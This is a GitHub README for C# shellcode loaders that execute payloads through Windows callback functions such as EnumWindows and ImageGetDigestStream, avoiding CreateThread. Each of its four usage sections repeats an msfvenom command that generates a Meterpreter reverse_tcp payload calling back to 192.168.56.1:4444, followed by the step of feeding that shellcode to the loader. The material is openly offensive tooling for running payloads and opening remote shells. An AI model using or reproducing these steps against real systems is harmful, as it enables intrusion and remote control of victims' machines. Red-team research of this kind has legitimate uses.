# NativePayload_CBT
NativePayload_CallBackTechniques C# Codes (Code Execution via CallBack Functions, without CreateThread Native API)
------------
Note: These C# Codes Tested by .NetFramework 3.5 or 4.0 only ;) & some of Codes are ready but i will Publish almost all of them from S4R1N C++ repo (soon)

Note: These Useful Techniques made by Security Researcher @S4R1N. 

Special Thanks to S4R1N for Original C++ Source ==> https://github.com/S4R1N/AlternativeShellcodeExec
--------------------------------------------

 NativePayload_ImageGetDigestStream.cs (Callback Functions Technique via ImageGetDigestStream Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_ImageGetDigestStream.exe  [payload...]
    example: NativePayload_ImageGetDigestStream.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_ImageGetDigestStream.png)

 -----------------------------------------------------------    
  NativePayload_EnumWindows.cs (Callback Functions Technique via EnumWindows Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumWindows.exe  [payload...]
    example: NativePayload_EnumWindows.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumWindows.png)

 --------------------------------------------    
  NativePayload_EnumWindowStationsW.cs (Callback Functions Technique via EnumWindowStationsW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumWindowStationsW.exe  [payload...]
    example: NativePayload_EnumWindowStationsW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumWindowStationW.png)
   
   --------------------------------------------    
  NativePayload_EnumResourceTypesW.cs (Callback Functions Technique via EnumResourceTypesW Native API)
 
 usage: 
    
    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
    step2: [win] NativePayload_EnumResourceTypesW.exe  [payload...]
    example: NativePayload_EnumResourceTypesW.exe "fc,48,00,87,00,...."

   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumResourceTypesW.png)

 --------------------------------------------    
